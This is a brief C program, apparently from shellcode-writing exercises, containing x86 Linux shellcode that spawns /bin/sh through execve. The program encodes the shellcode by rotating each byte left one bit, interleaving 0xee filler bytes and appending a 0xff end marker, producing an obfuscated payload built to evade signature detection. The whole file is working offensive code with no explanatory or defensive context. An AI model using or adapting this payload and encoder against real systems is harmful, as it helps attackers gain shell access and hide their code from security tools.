
#include <stdio.h>
#include <string.h>

unsigned char exec_shellcode[] = \
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe1\x89\xe2\xb0\x0b\xcd\x80";

main()
{
	int i = 0;
	
	printf("Shellexec_shellcode Length:  %d\n", strlen(exec_shellcode));

	for(i = 0; i < strlen(exec_shellcode); i++) {
	  	printf("0x%02x,", (((exec_shellcode[i] << 1) & 0xFF) | (exec_shellcode[i] >> (8-1))));
	  	printf("0x%02x,", 0xee );
	  	
	}

	/* shellcode end mark */
		
	printf("0x%02x,", 0xff);
}
